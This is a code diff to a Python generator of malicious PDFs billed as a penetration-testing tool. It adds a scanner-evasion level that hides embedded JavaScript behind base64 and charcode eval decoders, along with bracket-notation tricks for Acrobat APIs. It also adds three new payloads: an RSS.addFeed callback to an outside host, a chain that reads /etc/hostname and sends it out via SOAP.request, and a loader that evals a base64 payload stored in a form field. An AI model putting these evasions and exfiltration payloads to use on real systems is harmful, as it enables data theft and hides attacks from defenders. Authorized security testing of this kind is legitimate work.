@@ -107,11 +107,76 @@ def _string_to_hex(match):
 
 
 def _obfuscate_js_payload(js_bytes):
-    """Obfuscate JavaScript code using eval + String.fromCharCode."""
-    # Extract the JS string content from between ( and )
-    # We wrap the entire payload in eval(String.fromCharCode(...))
+    """Obfuscate JavaScript code using eval + String.fromCharCode.
+
+    Used by Level 4 staging for browser-API JS payloads (test33_9..12) where
+    Acrobat-specific decoders like util.streamFromString are unavailable.
+    """
     codes = ','.join(str(b) for b in js_bytes)
     return f'eval(String.fromCharCode({codes}))'.encode()
+
+
+def _obfuscate_js_payload_b64(js_bytes):
+    """Obfuscate JS by base64-encoding it and decoding via Acrobat util APIs.
+
+    Wraps the original payload in:
+        eval(util.stringFromStream(util.streamFromString("BASE64"),"base64"))
+
+    Inspired by the April 2026 Adobe Reader 0-day blog sample which staged
+    its payload through util.stringFromStream / SOAP.streamDecode.
+    """
+    b64 = base64.b64encode(js_bytes).decode('ascii')
+    return (
+        f'eval(util.stringFromStream('
+        f'util.streamFromString("{b64}"),"base64"))'
+    ).encode('latin-1')
+
+
+# Heuristic: substrings that indicate a JS payload targets PDF.js / browser APIs
+# rather than Acrobat. Used by Level 4 to pick the right wrapper.
+_BROWSER_API_HINTS = (b'fetch(', b'XMLHttpRequest', b'new Image', b'WebSocket')
+
+
+def _rewrite_js_blocks(data, transform):
+    """Rewrite every /JS (...) payload in `data` via `transform(bytes) -> bytes`.
+
+    Walks paren depth manually so it handles arbitrarily nested parens and PDF
+    backslash escapes inside the payload — unlike a flat regex which can only
+    handle one level of nesting. Used by both Level 2 (bracket notation) and
+    Level 4 (payload staging).
+    """
+    pattern = re.compile(rb'/JS\s*\(')
+    out = bytearray()
+    pos = 0
+    while True:
+        m = pattern.search(data, pos)
+        if not m:
+            out.extend(data[pos:])
+            break
+        out.extend(data[pos:m.end()])  # everything up to and including the (
+        depth = 1
+        i = m.end()
+        while i < len(data) and depth > 0:
+            c = data[i]
+            if c == 0x5c:  # backslash escape — skip the next byte
+                i += 2
+                continue
+            if c == 0x28:  # (
+                depth += 1
+            elif c == 0x29:  # )
+                depth -= 1
+                if depth == 0:
+                    break
+            i += 1
+        if depth != 0:
+            # Unbalanced — bail and emit the rest as-is
+            out.extend(data[m.end():])
+            return bytes(out)
+        content = data[m.end():i]
+        out.extend(transform(content))
+        out.extend(b')')
+        pos = i + 1
+    return bytes(out)
 
 
 def _obfuscate_js_bracket_notation(js_bytes):
@@ -123,8 +188,14 @@ def _obfuscate_js_bracket_notation(js_bytes):
         ('app.launchURL', 'app["launchURL"]'),
         ('app.openDoc', 'app["openDoc"]'),
         ('app.media.getURLData', 'app["media"]["getURLData"]'),
+        ('app.setTimeOut', 'app["setTimeOut"]'),
         ('SOAP.connect', 'SOAP["connect"]'),
         ('SOAP.request', 'SOAP["request"]'),
+        ('SOAP.streamDecode', 'SOAP["streamDecode"]'),
+        ('RSS.addFeed', 'RSS["addFeed"]'),
+        ('util.readFileIntoStream', 'util["readFileIntoStream"]'),
+        ('util.stringFromStream', 'util["stringFromStream"]'),
+        ('util.streamFromString', 'util["streamFromString"]'),
         ('this.importDataObject', 'this["importDataObject"]'),
     ]
     for old, new in replacements:
@@ -165,6 +236,7 @@ def obfuscate_pdf(filepath, level):
     Level 1: PDF name hex encoding + string octal/hex encoding
     Level 2: Level 1 + JS obfuscation + XSS URI variations
     Level 3: Level 2 + FlateDecode stream compression
+    Level 4: Level 3 + JS payload staging (base64 / charcode decoder wrap)
     """
     try:
         data = filepath.read_bytes()
@@ -174,23 +246,24 @@ def obfuscate_pdf(filepath, level):
     if not data.startswith(b'%PDF'):
         return
 
+    # --- Level 4: JS payload staging (must run BEFORE Level 2 bracket notation) ---
+    # Wrap the inner content of every /JS (...) block in a decoder stub so the
+    # original API calls never appear as literal substrings. Bracket-notation
+    # in Level 2 then operates on the OUTER wrapper, leaving the base64 blob
+    # opaque to static scanners.
+    if level >= 4:
+        def _stage_js_content(js_content):
+            if any(hint in js_content for hint in _BROWSER_API_HINTS):
+                return _obfuscate_js_payload(js_content)
+            return _obfuscate_js_payload_b64(js_content)
+
+        data = _rewrite_js_blocks(data, _stage_js_content)
+
     # --- Level 2: JavaScript + XSS obfuscation (applied BEFORE string encoding) ---
     if level >= 2:
-        # Obfuscate JavaScript payloads using bracket notation
-        # Must run before level 1 string encoding mangles the JS content
-        def _obf_js_content(m):
-            prefix = m.group(1)
-            js_content = m.group(2)
-            obfuscated = _obfuscate_js_bracket_notation(js_content)
-            return prefix + b'(' + obfuscated + b')'
-
-        # Match /JS followed by a parenthesized string (greedy, handles nested parens)
-        data = re.sub(
-            rb'(/JS\s*)\(((?:[^()]*\([^()]*\))*[^()]*)\)',
-            _obf_js_content,
-            data,
-            count=0
-        )
+        # Obfuscate JavaScript payloads using bracket notation.
+        # Must run before level 1 string encoding mangles the JS content.
+        data = _rewrite_js_blocks(data, _obfuscate_js_bracket_notation)
 
         # Obfuscate javascript: URIs with case variation
         data = re.sub(
@@ -2614,6 +2687,121 @@ def create_malpdf33_12(filename, host):
         'new WebSocket("' + ws_host + '/test33_12-ws")',
         'js-ws')
 
+# test33.13: RSS.addFeed() - Acrobat JS RSS feed callback
+# Source: April 2026 Adobe Reader 0-day blog post (ExpMon)
+# RSS.addFeed is a bidirectional C2 primitive in Acrobat's JS engine.
+def create_malpdf33_13(filename, host):
+    _js_callback_pdf(filename, host,
+        'RSS.addFeed({cURL: "' + host + '/test33_13-rss-addfeed"})',
+        'js-rss-addfeed')
+
+# test33.14: util.readFileIntoStream() + SOAP.request() exfil chain
+# Source: April 2026 Adobe Reader 0-day blog post (ExpMon)
+# Reads a local file via util.readFileIntoStream and exfiltrates the content
+# via SOAP.request. The try/catch ensures the error path also produces a
+# callback when the read is blocked by the Acrobat sandbox, so the test still
+# functions as an API surface probe.
+def create_malpdf33_14(filename, host):
+    _js_callback_pdf(filename, host,
+        'try{var s=util.readFileIntoStream("/etc/hostname",0);'
+        'SOAP.request({cURL:"' + host + '/test33_14-readfile",'
+        'oRequest:{"x":util.stringFromStream(s)},cAction:""})}catch(e){'
+        'SOAP.request({cURL:"' + host + '/test33_14-readfile-err",'
+        'oRequest:{"e":e.toString()},cAction:""})}',
+        'js-readfile')
+
+# test33.15: Form-field-staged JS loader
+# Source: April 2026 Adobe Reader 0-day blog post (ExpMon)
+# The actual payload is base64-encoded inside an AcroForm /Tx widget /V value.
+# OpenAction JS is just a loader stub that retrieves the field value via
+# getField() and decodes/evals it. This defeats naive /JS regex scanners that
+# only inspect the literal /JS (...) block. Inner payload is app.launchURL().
+def create_malpdf33_15(filename, host):
+    inner_js = 'app.launchURL("' + host + '/test33_15-staged")'
+    payload_b64 = base64.b64encode(inner_js.encode('latin-1')).decode('ascii')
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /AcroForm << /Fields [5 0 R] >>
+     /OpenAction 6 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [5 0 R]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'staged-loader') Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Annot
+     /Subtype /Widget
+     /Rect [0 0 0 0]
+     /FT /Tx
+     /T (btn1)
+     /V (''' + payload_b64 + ''')
+     /F 2
+  >>
+endobj
+
+6 0 obj
+  << /Type /Action
+     /S /JavaScript
+     /JS (eval(util.stringFromStream(util.streamFromString(getField("btn1").value),"base64")))
+  >>
+endobj
+
+xref
+0 7
+0000000000 65535 f
+0000000010 00000 n
+0000000115 00000 n
+0000000196 00000 n
+0000000400 00000 n
+0000000510 00000 n
+0000000640 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 7
+  >>
+startxref
+800
+%%EOF
+''')
+
 
 # PDF101 Research: UNC credential theft - individual test cases
 # Each tests NTLM hash theft via a single action type using UNC paths
@@ -4022,7 +4210,7 @@ def _inject_credit(output_dir, file_extensions):
 def main():
     """Main function to generate malicious PDFs."""
     parser = argparse.ArgumentParser(
-        description="Generate 67 malicious PDF files with phone-home functionality for penetration testing. "
+        description="Generate 70 malicious PDF files with phone-home functionality for penetration testing. "
                     "Covers URI actions, JavaScript execution, form submission, annotation injection, "
                     "widget-based XSS, content extraction, XXE, CSP bypass, and more. "
                     "Use with Burp Collaborator or Interact.sh to detect callbacks."
@@ -4030,8 +4218,8 @@ def main():
     parser.add_argument("host", help="Callback URL or IP address (e.g. https://burp-collaborator-url)")
     parser.add_argument("--output-dir", default="output", help="Directory to save generated PDF files (default: output/)")
     parser.add_argument("--no-credit", action="store_true", help="Do not embed credit/attribution metadata in generated PDFs")
-    parser.add_argument("--obfuscate", type=int, choices=[0, 1, 2, 3], default=0, metavar="LEVEL",
-                        help="Obfuscation level: 0=none (default), 1=name/string encoding, 2=+JS/XSS obfuscation, 3=+stream compression")
+    parser.add_argument("--obfuscate", type=int, choices=[0, 1, 2, 3, 4], default=0, metavar="LEVEL",
+                        help="Obfuscation level: 0=none (default), 1=name/string encoding, 2=+JS/XSS obfuscation, 3=+stream compression, 4=+JS payload staging (base64 decoder wrap)")
     args = parser.parse_args()
 
     host = args.host
@@ -4090,6 +4278,9 @@ def main():
         '33_10': (create_malpdf33_10, ensure_scheme(host)),
         '33_11': (create_malpdf33_11, ensure_scheme(host)),
         '33_12': (create_malpdf33_12, ensure_scheme(host)),
+        '33_13': (create_malpdf33_13, ensure_scheme(host)),
+        '33_14': (create_malpdf33_14, ensure_scheme(host)),
+        '33_15': (create_malpdf33_15, ensure_scheme(host)),
         '34_1': (create_malpdf34_1, host),
         '34_2': (create_malpdf34_2, host),
         '34_3': (create_malpdf34_3, host),
